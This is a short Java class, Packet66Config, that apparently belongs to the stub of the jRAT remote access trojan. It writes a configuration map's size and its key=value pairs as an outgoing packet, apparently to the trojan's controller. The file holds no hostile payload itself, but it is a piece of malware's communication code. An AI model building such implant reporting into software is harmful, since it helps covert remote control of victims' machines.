package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;
import java.util.Map;


public class Packet66Config extends AbstractOutgoingPacket {

	private Map<String, String> config;

	public Packet66Config(Map<String, String> config) {
		this.config = config;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(config.size());

		for (String key : config.keySet()) {
			sw.writeLine(key + "=" + config.get(key));
		}
	}

	@Override
	public byte getPacketId() {
		return 66;
	}

}
